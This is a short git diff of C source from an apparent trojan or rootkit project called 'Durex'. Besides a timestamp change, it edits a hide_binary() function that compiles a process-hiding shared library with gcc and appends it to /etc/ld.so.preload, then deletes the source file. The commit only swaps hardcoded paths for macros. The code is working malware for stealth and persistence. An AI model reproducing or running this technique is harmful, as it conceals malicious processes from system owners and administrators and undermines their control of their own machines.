@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/06 19:57:35 by root             ###   ########.fr       */
+/*   Updated: 2018/08/11 19:18:41 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -154,8 +154,8 @@ int			hide_binary()
 	close(fd);
 	if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1)
 		return install_error(-1);
-	system("gcc -Wall -fPIC -shared -o /usr/local/lib/Durex.so processhider.c -ldl");
-	system("echo /usr/local/lib/Durex.so >> /etc/ld.so.preload");
+	system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl");
+	system("echo "DUREX_PROCESSHIDER_LIB" >> "DUREX_PRELOAD);
 	remove(DUREX_PROCESSHIDER_FIL);
 	return 0;
 }
